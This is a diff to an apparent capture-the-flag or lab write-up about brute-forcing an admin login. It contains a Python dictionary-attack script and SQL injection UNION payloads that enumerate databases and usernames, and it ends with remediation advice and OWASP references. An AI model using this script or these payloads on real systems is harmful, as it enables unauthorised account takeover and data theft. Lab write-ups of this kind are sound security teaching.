@@ -21,7 +21,7 @@ def read_file(path: str):
 	return lines
 ````
 
-Then, for each password in that list, we send a request to the server with the username `admin` using the function `try_authentication`. Every time we attempt an incorrect password, the server responds with a specific length, in our case, 1988 characters. By recognizing this pattern, we can determine the correctness of a password based on the length of the response. Therefore, if a response has a different number of characters than 1988, we know the password is correct.
+Then, for each password in that list, we send a request to the server with the username `admin` using the function `try_authentication`. Every time we attempt an incorrect password, the server responds with a specific page. By recognizing this pattern, we can determine the correctness of a password based on the presence of the word `flag` in the response page. Therefore, if a response contains the word `flag`, we know the password is correct.
 ``` python
 def try_authentication(wrong_request_length: int, username: str, password: str):
   print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
@@ -37,20 +37,33 @@ def try_authentication(wrong_request_length: int, username: str, password: str):
 	url = 'http://192.168.56.2/?{}'.format(encoded_params)
 
 	response = requests.get(url)
-	success = len(response.text) != wrong_request_length
+	success = response.text.find('flag') != -1
 	print(success)
 
 	return success, response.text
 ```
 
-Once we find the correct password by print the response containing the flag we are looking for.
+We use the username `admin` after discovering it during the `sql_injection_members` phase. Initially, we ran the query `1 UNION SELECT schema_name, 1 FROM information_schema.schemata;` to obtain a list of available databases. Subsequently, we executed `1 UNION SELECT username, 1 FROM Member_Brute_Force.db_default;` to retrieve a list of accessible users. Upon discovering the correct password, we printed the response containing the sought-after flag.
 ```python
-for password in passwords:
-	success, response = try_authentication(wrong_request_length, username, password)
+def main():
+  try:
+    assert len(sys.argv) == 2, "IP address is not valid."
 
-	if success:
-		print(response)
-		return
+    print("=== Brute forcing website ===")
+    username = "admin"
+    file = "dictionary.txt"
+    passwords = read_file(file)
+
+    for password in passwords:
+      success, response = try_authentication(username, password)
+
+      if success:
+        print(response)
+        return
+
+    print(f"Password for username {username} is not in list.")
+  except Exception as err:
+    print(f'Error: {err}')
 ```
 
 ### How to fix
@@ -64,3 +77,5 @@ It is important for the service to compel users to select a strong password, saf
 [OWASP - Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
 
 [OWASP - Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
+
+[MySQL - The INFORMATION_SCHEMA SCHEMATA Table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)
